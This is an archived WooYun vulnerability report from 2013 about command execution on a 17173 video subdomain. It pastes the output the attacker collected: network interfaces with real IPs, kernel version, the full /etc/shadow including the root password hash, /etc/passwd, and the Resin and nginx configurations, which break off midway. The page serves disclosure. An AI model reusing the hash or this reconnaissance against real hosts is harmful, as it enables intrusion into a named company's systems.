<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		17173某站命令执行漏洞  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		17173某站命令执行漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/【|→上善若水】">【|→上善若水】</a> 
</li><li>提交时间：		2013-12-10 15:39</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-12-10：	细节已通知厂商并且等待厂商处理中<br/>
									2013-12-11：	厂商已经确认，细节仅向厂商公开<br/>
									2013-12-21：	细节向核心白帽子及相关领域专家公开<br/>
									2013-12-31：	细节向普通白帽子公开<br/>
									2014-01-10：	细节向实习白帽子公开<br/>
									2014-01-24：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail"><br />
</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">通过漏洞利用工具可查看多处敏感信息。<br />
<br />
以下为收集信息：<br />
<br />
http://v.17173.com/live/rank/rank.action<br />
<br />
<br />
<br />
=======pwd========<br />
<br />
/opt/17173/resin-3.1.9<br />
<br />
<br />
<br />
<br />
<br />
PATH:/home/httpd/html/active/live/agreement/img/<br />
<br />
<br />
<br />
=======ifconfig==================================================================================================<br />
<br />
eth0      Link encap:Ethernet  HWaddr 5C:F3:FC:4A:F8:F4  <br />
<br />
          inet addr:117.27.230.153  Bcast:117.27.230.191  Mask:255.255.255.192<br />
<br />
          inet6 addr: fe80::5ef3:fcff:fe4a:f8f4/64 Scope:Link<br />
<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
<br />
          RX packets:5667640 errors:0 dropped:0 overruns:0 frame:0<br />
<br />
          TX packets:2489078 errors:0 dropped:0 overruns:0 carrier:0<br />
<br />
          collisions:0 txqueuelen:1000 <br />
<br />
          RX bytes:390957349 (372.8 MiB)  TX bytes:1813703159 (1.6 GiB)<br />
<br />
<br />
<br />
eth1      Link encap:Ethernet  HWaddr 5C:F3:FC:4A:F8:F6  <br />
<br />
          inet addr:10.59.108.19  Bcast:10.59.108.255  Mask:255.255.255.0<br />
<br />
          inet6 addr: fe80::5ef3:fcff:fe4a:f8f6/64 Scope:Link<br />
<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
<br />
          RX packets:10715997405 errors:0 dropped:0 overruns:0 frame:0<br />
<br />
          TX packets:9142749447 errors:0 dropped:0 overruns:0 carrier:0<br />
<br />
          collisions:0 txqueuelen:1000 <br />
<br />
          RX bytes:2170583358838 (1.9 TiB)  TX bytes:1981133660005 (1.8 TiB)<br />
<br />
<br />
<br />
lo        Link encap:Local Loopback  <br />
<br />
          inet addr:127.0.0.1  Mask:255.0.0.0<br />
<br />
          inet6 addr: ::1/128 Scope:Host<br />
<br />
          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br />
<br />
          RX packets:705697602 errors:0 dropped:0 overruns:0 frame:0<br />
<br />
          TX packets:705697602 errors:0 dropped:0 overruns:0 carrier:0<br />
<br />
          collisions:0 txqueuelen:0 <br />
<br />
          RX bytes:631787284574 (588.3 GiB)  TX bytes:631787284574 (588.3 GiB)<br />
<br />
<br />
<br />
============uname -a ==============================================================================<br />
<br />
Linux resin19 2.6.32-358.el6.x86_64 #1 SMP Tue Jan 29 11:47:41 EST 2013 x86_64 x86_64 x86_64 GNU/Linux<br />
<br />
<br />
<br />
<br />
<br />
===================/etc/shadow===================================<br />
<br />
<br />
<br />
root:$1$ltvWzIiD$0nSk23ZRaUbCl5iyb6RMz1:15977:0:99999:7:::<br />
<br />
bin:*:15615:0:99999:7:::<br />
<br />
daemon:*:15615:0:99999:7:::<br />
<br />
adm:*:15615:0:99999:7:::<br />
<br />
lp:*:15615:0:99999:7:::<br />
<br />
sync:*:15615:0:99999:7:::<br />
<br />
shutdown:*:15615:0:99999:7:::<br />
<br />
halt:*:15615:0:99999:7:::<br />
<br />
mail:*:15615:0:99999:7:::<br />
<br />
uucp:*:15615:0:99999:7:::<br />
<br />
operator:*:15615:0:99999:7:::<br />
<br />
games:*:15615:0:99999:7:::<br />
<br />
gopher:*:15615:0:99999:7:::<br />
<br />
ftp:*:15615:0:99999:7:::<br />
<br />
nobody:*:15615:0:99999:7:::<br />
<br />
dbus:!!:15965::::::<br />
<br />
rpc:!!:15965:0:99999:7:::<br />
<br />
vcsa:!!:15965::::::<br />
<br />
abrt:!!:15965::::::<br />
<br />
saslauth:!!:15965::::::<br />
<br />
mailnull:!!:15965::::::<br />
<br />
smmsp:!!:15965::::::<br />
<br />
haldaemon:!!:15965::::::<br />
<br />
ntp:!!:15965::::::<br />
<br />
apache:!!:15965::::::<br />
<br />
rpcuser:!!:15965::::::<br />
<br />
nfsnobody:!!:15965::::::<br />
<br />
gdm:!!:15965::::::<br />
<br />
sshd:!!:15965::::::<br />
<br />
postfix:!!:15965::::::<br />
<br />
mysql:!!:15965::::::<br />
<br />
tcpdump:!!:15965::::::<br />
<br />
oprofile:!!:15965::::::<br />
<br />
nagios:!!:15965:0:99999:7:::<br />
<br />
<br />
<br />
===================/etc/passwd===================================<br />
<br />
<br />
<br />
root:x:0:0:root:/root:/bin/bash<br />
<br />
bin:x:1:1:bin:/bin:/sbin/nologin<br />
<br />
daemon:x:2:2:daemon:/sbin:/sbin/nologin<br />
<br />
adm:x:3:4:adm:/var/adm:/sbin/nologin<br />
<br />
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br />
<br />
sync:x:5:0:sync:/sbin:/bin/sync<br />
<br />
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br />
<br />
halt:x:7:0:halt:/sbin:/sbin/halt<br />
<br />
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br />
<br />
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin<br />
<br />
operator:x:11:0:operator:/root:/sbin/nologin<br />
<br />
games:x:12:100:games:/usr/games:/sbin/nologin<br />
<br />
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin<br />
<br />
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br />
<br />
nobody:x:99:99:Nobody:/:/sbin/nologin<br />
<br />
dbus:x:81:81:System message bus:/:/sbin/nologin<br />
<br />
rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin<br />
<br />
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin<br />
<br />
abrt:x:173:173::/etc/abrt:/sbin/nologin<br />
<br />
saslauth:x:499:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologin<br />
<br />
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin<br />
<br />
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin<br />
<br />
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin<br />
<br />
ntp:x:38:38::/etc/ntp:/sbin/nologin<br />
<br />
apache:x:48:48:Apache:/var/www:/sbin/nologin<br />
<br />
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin<br />
<br />
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin<br />
<br />
gdm:x:42:42::/var/lib/gdm:/sbin/nologin<br />
<br />
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br />
<br />
postfix:x:89:89::/var/spool/postfix:/sbin/nologin<br />
<br />
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash<br />
<br />
tcpdump:x:72:72::/:/sbin/nologin<br />
<br />
oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin<br />
<br />
nagios:x:500:500::/home/nagios:/bin/bash<br />
<br />
<br />
<br />
<br />
<br />
==================/opt/17173/resin-3.1.9=======================================================================<br />
<br />
admin<br />
<br />
bin<br />
<br />
conf<br />
<br />
ext-webapp-lib<br />
<br />
lib<br />
<br />
libexec64<br />
<br />
log<br />
<br />
php<br />
<br />
plugins<br />
<br />
webapps<br />
<br />
<br />
<br />
=====================/opt/17173/resin-3.1.9/conf/resin.conf=============================================<br />
<br />
&lt;!--<br />
<br />
   - Resin 3.1 configuration file.<br />
<br />
  --&gt;<br />
<br />
&lt;resin xmlns=&quot;http://caucho.com/ns/resin&quot;<br />
<br />
       xmlns:resin=&quot;http://caucho.com/ns/resin/core&quot;&gt;<br />
<br />
<br />
<br />
  &lt;!-- adds all .jar files under the resin/lib directory --&gt;<br />
<br />
  &lt;class-loader&gt;<br />
<br />
    &lt;tree-loader path=&quot;${resin.home}/ext-lib&quot;/&gt;<br />
<br />
    &lt;tree-loader path=&quot;${resin.root}/ext-lib&quot;/&gt;<br />
<br />
<br />
<br />
    &lt;tree-loader path=&quot;${resin.home}/lib&quot;/&gt;<br />
<br />
    &lt;tree-loader path=&quot;${resin.root}/lib&quot;/&gt;<br />
<br />
  &lt;/class-loader&gt;<br />
<br />
<br />
<br />
  &lt;!--<br />
<br />
     - Management configuration<br />
<br />
     -<br />
<br />
     - Remote management requires at least one enabled admin user.<br />
<br />
    --&gt;<br />
<br />
  &lt;management path=&quot;${resin.root}/admin&quot;&gt;<br />
<br />
    &lt;user name=&quot;admin&quot; password=&quot;password&quot; disable=&quot;true&quot;/&gt;<br />
<br />
<br />
<br />
    &lt;resin:if test=&quot;${resin.professional}&quot;&gt;<br />
<br />
      &lt;deploy-service/&gt;<br />
<br />
      &lt;jmx-service/&gt;<br />
<br />
      &lt;log-service/&gt;<br />
<br />
      &lt;xa-log-service/&gt;<br />
<br />
    &lt;/resin:if&gt;<br />
<br />
  &lt;/management&gt;<br />
<br />
<br />
<br />
  &lt;!--<br />
<br />
     - Logging configuration for the JDK logging API.<br />
<br />
    --&gt;<br />
<br />
  &lt;log name=&quot;&quot; level=&quot;info&quot; path=&quot;stdout:&quot;<br />
<br />
       timestamp=&quot;[%H:%M:%S.%s] {%{thread}} &quot;/&gt;<br />
<br />
<br />
<br />
  &lt;!--<br />
<br />
     - &#039;info&#039; for production<br />
<br />
     - &#039;fine&#039; or &#039;finer&#039; for development and troubleshooting<br />
<br />
    --&gt;<br />
<br />
  &lt;logger name=&quot;com.caucho&quot; level=&quot;info&quot;/&gt;<br />
<br />
<br />
<br />
  &lt;logger name=&quot;com.caucho.java&quot; level=&quot;config&quot;/&gt;<br />
<br />
  &lt;logger name=&quot;com.caucho.loader&quot; level=&quot;config&quot;/&gt;<br />
<br />
<br />
<br />
  &lt;!--<br />
<br />
     - For production sites, change dependency-check-interval to something<br />
<br />
     - like 600s, so it only checks for updates every 10 minutes.<br />
<br />
    --&gt;<br />
<br />
  &lt;dependency-check-interval&gt;2s&lt;/dependency-check-interval&gt;<br />
<br />
<br />
<br />
  &lt;!--<br />
<br />
     - SMTP server for sending mail notifications<br />
<br />
    --&gt;<br />
<br />
  &lt;system-property mail.smtp.host=&quot;127.0.0.1&quot;/&gt;<br />
<br />
  &lt;system-property mail.smtp.port=&quot;25&quot;/&gt;<br />
<br />
<br />
<br />
  &lt;!--<br />
<br />
     - Sets the default character encoding to utf-8<br />
<br />
     -<br />
<br />
     - &lt;character-encoding&gt;utf-8&lt;/character-encoding&gt;<br />
<br />
    --&gt;<br />
<br />
<br />
<br />
  &lt;!--<br />
<br />
     - You can change the compiler to &quot;javac&quot;, &quot;eclipse&quot; or &quot;internal&quot;.<br />
<br />
    --&gt;<br />
<br />
  &lt;javac compiler=&quot;internal&quot; args=&quot;-source 1.5&quot;/&gt;<br />
<br />
<br />
<br />
  &lt;!-- Security providers.<br />
<br />
     - &lt;security-provider&gt;<br />
<br />
     -    com.sun.net.ssl.internal.ssl.Provider<br />
<br />
     - &lt;/security-provider&gt;<br />
<br />
    --&gt;<br />
<br />
<br />
<br />
  &lt;!-- Uncomment to use Resin&#039;s XML implementations<br />
<br />
     -<br />
<br />
     - &lt;system-property javax.xml.parsers.DocumentBuilderFactory<br />
<br />
     -                 =&quot;com.caucho.xml.parsers.XmlDocumentBuilderFactory&quot;/&gt;<br />
<br />
     - &lt;system-property javax.xml.parsers.SAXParserFactory<br />
<br />
     -                 =&quot;com.caucho.xml.parsers.XmlSAXParserFactory&quot;/&gt;<br />
<br />
    --&gt;<br />
<br />
<br />
<br />
  &lt;cluster id=&quot;app-tier&quot;&gt;<br />
<br />
    &lt;!-- sets the content root for the cluster, relative to server.root --&gt;<br />
<br />
    &lt;root-directory&gt;.&lt;/root-directory&gt;<br />
<br />
<br />
<br />
    &lt;server-default&gt;<br />
<br />
      &lt;!-- The http port --&gt;<br />
<br />
      &lt;http address=&quot;*&quot; port=&quot;8080&quot;/&gt;<br />
<br />
<br />
<br />
      &lt;!--<br />
<br />
         - SSL port configuration:<br />
<br />
         -<br />
<br />
         - &lt;http address=&quot;*&quot; port=&quot;8443&quot;&gt;<br />
<br />
         -   &lt;openssl&gt;<br />
<br />
         -     &lt;certificate-file&gt;keys/gryffindor.crt&lt;/certificate-file&gt;<br />
<br />
         -     &lt;certificate-key-file&gt;keys/gryffindor.key&lt;/certificate-key-file&gt;<br />
<br />
         -     &lt;password&gt;test123&lt;/password&gt;<br />
<br />
         -   &lt;/openssl&gt;<br />
<br />
         - &lt;/http&gt;<br />
<br />
        --&gt;<br />
<br />
<br />
<br />
      &lt;!--<br />
<br />
         - The JVM arguments<br />
<br />
        --&gt;<br />
<br />
      &lt;jvm-arg&gt;-Xmx256m&lt;/jvm-arg&gt;<br />
<br />
      &lt;jvm-arg&gt;-Xss1m&lt;/jvm-arg&gt;<br />
<br />
      &lt;jvm-arg&gt;-Xdebug&lt;/jvm-arg&gt;<br />
<br />
      &lt;jvm-arg&gt;-Dcom.sun.management.jmxremote&lt;/jvm-arg&gt;<br />
<br />
<br />
<br />
      &lt;!--<br />
<br />
         - Uncomment to enable admin heap dumps<br />
<br />
         - &lt;jvm-arg&gt;-agentlib:resin&lt;/jvm-arg&gt;<br />
<br />
        --&gt;<br />
<br />
<br />
<br />
      &lt;!--<br />
<br />
         - arguments for the watchdog process<br />
<br />
        --&gt;<br />
<br />
      &lt;watchdog-jvm-arg&gt;-Dcom.sun.management.jmxremote&lt;/watchdog-jvm-arg&gt;<br />
<br />
      &lt;watchdog-port&gt;6600&lt;/watchdog-port&gt;<br />
<br />
<br />
<br />
      &lt;!--<br />
<br />
         - Configures the minimum free memory allowed before Resin<br />
<br />
         - will force a restart.<br />
<br />
        --&gt;<br />
<br />
      &lt;memory-free-min&gt;1M&lt;/memory-free-min&gt;<br />
<br />
<br />
<br />
      &lt;!-- Maximum number of threads. --&gt;<br />
<br />
      &lt;thread-max&gt;256&lt;/thread-max&gt;<br />
<br />
<br />
<br />
      &lt;!-- Configures the socket timeout --&gt;<br />
<br />
      &lt;socket-timeout&gt;65s&lt;/socket-timeout&gt;<br />
<br />
<br />
<br />
      &lt;!-- Configures the keepalive --&gt;<br />
<br />
      &lt;keepalive-max&gt;128&lt;/keepalive-max&gt;<br />
<br />
      &lt;keepalive-timeout&gt;15s&lt;/keepalive-timeout&gt;<br />
<br />
<br />
<br />
      &lt;!--<br />
<br />
         - If starting bin/resin as root on Unix, specify the user name<br />
<br />
         - and group name for the web server user.<br />
<br />
         -<br />
<br />
         - &lt;user-name&gt;resin&lt;/user-name&gt;<br />
<br />
         - &lt;group-name&gt;resin&lt;/group-name&gt;<br />
<br />
        --&gt;<br />
<br />
    &lt;/server-default&gt;<br />
<br />
<br />
<br />
    &lt;!-- define the servers in the cluster --&gt;<br />
<br />
    &lt;server id=&quot;&quot; address=&quot;127.0.0.1&quot; port=&quot;6800&quot;/&gt;<br />
<br />
<br />
<br />
    &lt;!--<br />
<br />
       - Configures the persistent store for single-server or clustered<br />
<br />
       - in Resin professional.<br />
<br />
      --&gt;<br />
<br />
    &lt;resin:if test=&quot;${resin.professional}&quot;&gt;<br />
<br />
      &lt;persistent-store type=&quot;cluster&quot;&gt;<br />
<br />
        &lt;init path=&quot;session&quot;/&gt;<br />
<br />
      &lt;/persistent-store&gt;<br />
<br />
    &lt;/resin:if&gt;<br />
<br />
<br />
<br />
    &lt;!--<br />
<br />
       - For security, use a different cookie for SSL sessions.<br />
<br />
       - &lt;ssl-session-cookie&gt;SSL_JSESSIONID&lt;/ssl-session-cookie&gt;<br />
<br />
      --&gt;<br />
<br />
<br />
<br />
    &lt;!--<br />
<br />
       - Enables the cache (available in Resin Professional) <br />
<br />
      --&gt;<br />
<br />
    &lt;resin:if test=&quot;${resin.professional}&quot;&gt;<br />
<br />
      &lt;cache path=&quot;cache&quot; memory-size=&quot;64M&quot;&gt;<br />
<br />
        &lt;!-- Vary header rewriting for IE --&gt;<br />
<br />
        &lt;rewrite-vary-as-private/&gt;<br />
<br />
      &lt;/cache&gt;<br />
<br />
    &lt;/resin:if&gt;<br />
<br />
<br />
<br />
    &lt;!--<br />
<br />
       - Enables periodic checking of the server status and<br />
<br />
       - check for deadlocks..<br />
<br />
       -<br />
<br />
       - All servers can add &lt;url&gt;s to be checked.<br />
<br />
      --&gt;<br />
<br />
    &lt;resin:if test=&quot;${resin.professional}&quot;&gt;<br />
<br />
      &lt;ping&gt;<br />
<br />
        &lt;!-- &lt;url&gt;http://localhost:8080/test-ping.jsp&lt;/url&gt; --&gt;<br />
<br />
      &lt;/ping&gt;<br />
<br />
    &lt;/resin:if&gt;<br />
<br />
<br />
<br />
    &lt;!--<br />
<br />
       - Defaults applied to each web-app.<br />
<br />
      --&gt;<br />
<br />
    &lt;web-app-default&gt;<br />
<br />
      &lt;prologue&gt;<br />
<br />
        &lt;!--<br />
<br />
           - Extension library for common jar files.  The ext is safe<br />
<br />
           - even for non-classloader aware jars.  The loaded classes<br />
<br />
           - will be loaded separately for each web-app, i.e. the class<br />
<br />
           - itself will be distinct.<br />
<br />
          --&gt;<br />
<br />
        &lt;class-loader&gt;<br />
<br />
          &lt;tree-loader path=&quot;${resin.root}/ext-webapp-lib&quot;/&gt;<br />
<br />
        &lt;/class-loader&gt;<br />
<br />
<br />
<br />
        &lt;!--<br />
<br />
           - Enable EL expressions in Servlet and Filter init-param<br />
<br />
          --&gt;<br />
<br />
        &lt;allow-servlet-el/&gt;<br />
<br />
      &lt;/prologue&gt;<br />
<br />
      <br />
<br />
      &lt;!--<br />
<br />
         - Sets timeout values for cacheable pages, e.g. static pages.<br />
<br />
        --&gt;<br />
<br />
      &lt;cache-mapping url-pattern=&quot;/&quot; expires=&quot;5s&quot;/&gt;<br />
<br />
      &lt;cache-mapping url-pattern=&quot;*.gif&quot; expires=&quot;60s&quot;/&gt;<br />
<br />
      &lt;cache-mapping url-pattern=&quot;*.jpg&quot; expires=&quot;60s&quot;/&gt;<br />
<br />
      &lt;cache-mapping url-pattern=&quot;*.png&quot; expires=&quot;60s&quot;/&gt;<br />
<br />
<br />
<br />
      &lt;!--<br />
<br />
         - for security, disable session URLs by default.<br />
<br />
        --&gt;<br />
<br />
      &lt;session-config&gt;<br />
<br />
        &lt;enable-url-rewriting&gt;false&lt;/enable-url-rewriting&gt;<br />
<br />
      &lt;/session-config&gt;<br />
<br />
<br />
<br />
      &lt;!--<br />
<br />
         - For security, set the HttpOnly flag in cookies.<br />
<br />
         - &lt;cookie-http-only/&gt;<br />
<br />
        --&gt;<br />
<br />
<br />
<br />
      &lt;!--<br />
<br />
         - Some JSP packages have incorrect .tld files.  It&#039;s possible to<br />
<br />
         - set validate-taglib-schema to false to work around these packages.<br />
<br />
        --&gt;<br />
<br />
        &lt;jsp&gt;<br />
<br />
          &lt;validate-taglib-schema&gt;true&lt;/validate-taglib-schema&gt;<br />
<br />
          &lt;fast-jstl&gt;true&lt;/fast-jstl&gt;<br />
<br />
        &lt;/jsp&gt;<br />
<br />
    &lt;/web-app-default&gt;<br />
<br />
<br />
<br />
    &lt;!-- includes the app-default for default web-app behavior --&gt;<br />
<br />
    &lt;resin:import path=&quot;${resin.home}/conf/app-default.xml&quot;/&gt;<br />
<br />
<br />
<br />
    &lt;!--<br />
<br />
       - Sample database pool configuration<br />
<br />
       -<br />
<br />
       - The JDBC name is java:comp/env/jdbc/test<br />
<br />
         &lt;database&gt;<br />
<br />
           &lt;jndi-name&gt;jdbc/mysql&lt;/jndi-name&gt;<br />
<br />
           &lt;driver type=&quot;org.gjt.mm.mysql.Driver&quot;&gt;<br />
<br />
             &lt;url&gt;jdbc:mysql://localhost:3306/test&lt;/url&gt;<br />
<br />
             &lt;user&gt;&lt;/user&gt;<br />
<br />
             &lt;password&gt;&lt;/password&gt;<br />
<br />
            &lt;/driver&gt;<br />
<br />
            &lt;prepared-statement-cache-size&gt;8&lt;/prepared-statement-cache-size&gt;<br />
<br />
            &lt;max-connections&gt;20&lt;/max-connections&gt;<br />
<br />
            &lt;max-idle-time&gt;30s&lt;/max-idle-time&gt;<br />
<br />
          &lt;/database&gt;<br />
<br />
      --&gt;<br />
<br />
<br />
<br />
    &lt;!--<br />
<br />
       - Default host configuration applied to all virtual hosts.<br />
<br />
      --&gt;<br />
<br />
    &lt;host-default&gt;<br />
<br />
      &lt;!--<br />
<br />
         - With another web server, like Apache, this can be commented out<br />
<br />
         - because the web server will log this information.<br />
<br />
        --&gt;<br />
<br />
      &lt;access-log path=&quot;logs/access.log&quot; <br />
<br />
            format=&#039;%h %l %u %t &quot;%r&quot; %s %b &quot;%{Referer}i&quot; &quot;%{User-Agent}i&quot;&#039;<br />
<br />
            rollover-period=&quot;1W&quot;/&gt;<br />
<br />
<br />
<br />
      &lt;!-- creates the webapps directory for .war expansion --&gt;<br />
<br />
      &lt;web-app-deploy path=&quot;webapps&quot;/&gt;<br />
<br />
<br />
<br />
      &lt;!-- creates the deploy directory for .ear expansion --&gt;<br />
<br />
      &lt;ear-deploy path=&quot;deploy&quot;&gt;<br />
<br />
        &lt;ear-default&gt;<br />
<br />
          &lt;ejb-server&gt;<br />
<br />
            &lt;config-directory&gt;WEB-INF&lt;/config-directory&gt;<br />
<br />
          &lt;/ejb-server&gt;<br />
<br />
        &lt;/ear-default&gt;<br />
<br />
      &lt;/ear-deploy&gt;<br />
<br />
<br />
<br />
      &lt;!-- creates the deploy directory for .rar expansion --&gt;<br />
<br />
      &lt;resource-deploy path=&quot;deploy&quot;/&gt;<br />
<br />
    &lt;/host-default&gt;<br />
<br />
<br />
<br />
    &lt;!-- configures a deployment directory for virtual hosts --&gt;<br />
<br />
    &lt;host-deploy path=&quot;hosts&quot;&gt;<br />
<br />
      &lt;host-default&gt;<br />
<br />
        &lt;resin:import path=&quot;host.xml&quot; optional=&quot;true&quot;/&gt;<br />
<br />
      &lt;/host-default&gt;<br />
<br />
    &lt;/host-deploy&gt;<br />
<br />
<br />
<br />
    &lt;!-- configures the default host, matching any host name --&gt;<br />
<br />
    &lt;host id=&quot;&quot; root-directory=&quot;.&quot;&gt;<br />
<br />
      &lt;!--<br />
<br />
         - configures an explicit root web-app matching the<br />
<br />
         - webapp&#039;s ROOT<br />
<br />
        --&gt;<br />
<br />
      &lt;web-app id=&quot;/&quot; root-directory=&quot;webapps/ROOT&quot;/&gt;<br />
<br />
<br />
<br />
      &lt;web-app id=&quot;/resin-admin&quot; root-directory=&quot;${resin.home}/php/admin&quot;&gt;<br />
<br />
        &lt;!--<br />
<br />
           - Administration application /resin-admin<br />
<br />
          --&gt;<br />
<br />
        &lt;prologue&gt;<br />
<br />
          &lt;resin:set var=&quot;resin_admin_external&quot; value=&quot;false&quot;/&gt;<br />
<br />
          &lt;resin:set var=&quot;resin_admin_insecure&quot; value=&quot;true&quot;/&gt;<br />
<br />
        &lt;/prologue&gt;<br />
<br />
      &lt;/web-app&gt;<br />
<br />
    &lt;/host&gt;<br />
<br />
  &lt;/cluster&gt;<br />
<br />
<br />
<br />
  &lt;!--<br />
<br />
     - Configuration for the web-tier/load-balancer<br />
<br />
    --&gt;<br />
<br />
  &lt;resin:if test=&quot;${resin.professional}&quot;&gt;<br />
<br />
    &lt;cluster id=&quot;web-tier&quot;&gt;<br />
<br />
      &lt;server-default&gt;<br />
<br />
        &lt;!-- The http port --&gt;<br />
<br />
        &lt;http address=&quot;*&quot; port=&quot;9080&quot;/&gt;<br />
<br />
      &lt;/server-default&gt;<br />
<br />
<br />
<br />
      &lt;server id=&quot;web-a&quot; address=&quot;127.0.0.1&quot; port=&quot;6700&quot;/&gt;<br />
<br />
<br />
<br />
      &lt;cache path=&quot;cache&quot; memory-size=&quot;64M&quot;/&gt;<br />
<br />
<br />
<br />
      &lt;host id=&quot;&quot;&gt;<br />
<br />
        &lt;web-app id=&quot;/&quot;&gt;<br />
<br />
<br />
<br />
           &lt;rewrite-dispatch&gt;<br />
<br />
             &lt;load-balance regexp=&quot;&quot; cluster=&quot;app-tier&quot;/&gt;<br />
<br />
           &lt;/rewrite-dispatch&gt;<br />
<br />
<br />
<br />
        &lt;/web-app&gt;<br />
<br />
      &lt;/host&gt;<br />
<br />
    &lt;/cluster&gt;<br />
<br />
  &lt;/resin:if&gt;<br />
<br />
&lt;/resin&gt;<br />
<br />
<br />
<br />
=======================nginx.conf================================================================<br />
<br />
user root root;<br />
<br />
<br />
<br />
worker_rlimit_nofile  51200;<br />
<br />
worker_processes  16;<br />
<br />
<br />
<br />
#error_log  logs/error.log  debug;<br />
<br />
error_log  logs/error_live.log  info;<br />
<br />
<br />
<br />
pid  sbin/nginx_live.pid;<br />
<br />
<br />
<br />
events {<br />
<br />
        worker_connections  10240;<br />
<br />
        use  epoll;<br />
<br />
}<br />
<br />
<br />
<br />
http {<br />
<br />
        server_tokens off;<br />
<br />
        include       mime.types;<br />
<br />
        default_type  application/octet-stream;<br />
<br />
<br />
<br />
        log_format vms &#039;$http_x_forwarded_for $remote_addr $host - $remote_user &#039;<br />
<br />
                       &#039;[$time_local] &quot;$request&quot; $status $body_bytes_sent &#039;<br />
<br />
                       &#039;$request_time &quot;$http_referer&quot; &quot;$http_user_agent&quot; &#039;<br />
<br />
                       &#039;$stream_type $limit_rate_after $limit_rate&#039;;<br />
<br />
<br />
<br />
	log_format common   &#039;$remote_addr &quot;$http_x_forwarded_for&quot; $host $remote_user &#039;<br />
<br />
       			&#039;[$time_local] &quot;$request&quot; $status $body_bytes_sent &#039;<br />
<br />
			&#039;$request_time &quot;$http_referer&quot; &quot;$http_user_agent&quot;&#039;;<br />
<br />
<br />
<br />
        access_log  logs/access_live.log  vms;<br />
<br />
<br />
<br />
        sendfile        on;<br />
<br />
        tcp_nopush      on;<br />
<br />
        tcp_nodelay     off;<br />
<br />
<br />
<br />
        keepalive_timeout       5;<br />
<br />
        keepalive_requests      2000;<br />
<br />
        send_timeout            120;<br />
<br />
        #client_body_timeout    10;<br />
<br />
        #client_header_timeout  10;<br />
<br />
<br />
<br />
        server_names_hash_max_size      512;<br />
<br />
        server_names_hash_bucket_size   128;<br />
<br />
<br />
<br />
        client_header_buffer_size       1k;<br />
<br />
        client_max_body_size            600m;<br />
<br />
        large_client_header_buffers     4 4k;<br />
<br />
        request_pool_size               1024k;<br />
<br />
        connection_pool_size            512;<br />
<br />
<br />
<br />
        output_buffers                  1 1024k;<br />
<br />
        postpone_output                 1460;<br />
<br />
        ignore_invalid_headers          on;<br />
<br />
<br />
<br />
        #expires       120d;<br />
<br />
        gzip          off;<br />
<br />
<br />
<br />
        map $request_filename $stream_type {<br />
<br />
                hostnames;<br />
<br />
                *.mp4      mp4;<br />
<br />
                *.flv      flv;<br />
<br />
                *.f4v      flv;<br />
<br />
                *.wmv      wmv;<br />
<br />
                *.asf      wmv;<br />
<br />
                *.wma      wmv;<br />
<br />
                default    oct;<br />
<br />
        }<br />
<br />
<br />
<br />
        server {<br />
<br />
                listen          8081;<br />
<br />
                server_name     _ &quot;&quot;;<br />
<br />
                access_log      off;<br />
<br />
		root 		/data/;<br />
<br />
        }<br />
<br />
<br />
<br />
        server {<br />
<br />
                listen          8080 default_server;<br />
<br />
                server_name     localhost;<br />
<br />
                root            /opt/nginx/html;<br />
<br />
<br />
<br />
                location ^~ /playlist/ {<br />
<br />
                        access_log       logs/live_accesss.log common;<br />
<br />
<br />
<br />
                        set $sock &quot;unix:/tmp/liveroom.sock&quot;;<br />
<br />
<br />
<br />
                        if ($uri ~ &quot;^/playlist/([0-9]+)\.m3u8&quot;) {<br />
<br />
                                expires                  -1;<br />
<br />
<br />
<br />
                                ffs_param M3U8           $1;<br />
<br />
                                ffs_param FORMAT         mpegts;<br />
<br />
                                ffs_pass                 $sock;<br />
<br />
                                break;<br />
<br />
                        }<br />
<br />
<br />
<br />
                        return 403;<br />
<br />
                }<br />
<br />
<br />
<br />
                location ^~ /hls/ {<br />
<br />
                        access_log       logs/live_accesss.log common;<br />
<br />
                        #access_log       off;<br />
<br />
                        accesskey        off;<br />
<br />
<br />
<br />
                        set $sock &quot;unix:/tmp/liveroom.sock&quot;;<br />
<br />
<br />
<br />
                        if ($uri ~ &quot;^/hls/([0-9]+)&quot;) {<br />
<br />
                                expires                  -1;<br />
<br />
                                add_header Content-Type  &quot;video/MP2T&quot;;<br />
<br />
<br />
<br />
                                ffs_param INPUT          $1;<br />
<br />
                                ffs_param FORMAT         mpegts;<br />
<br />
                                ffs_param SEEK_WHENCE    0;<br />
<br />
                                ffs_param START_TIME     $arg_start;<br />
<br />
                                ffs_param END_TIME       $arg_end;<br />
<br />
                                ffs_param VIDEO_CODEC    copy;<br />
<br />
                                ffs_param AUDIO_CODEC    copy;<br />
<br />
                                ffs_pass                 $sock;<br />
<br />
                                break;<br />
<br />
                        }<br />
<br />
<br />
<br />
                        return 403;<br />
<br />
                }<br />
<br />
<br />
<br />
                location ^~ /live/ {<br />
<br />
                        access_log       logs/live_accesss.log common;<br />
<br />
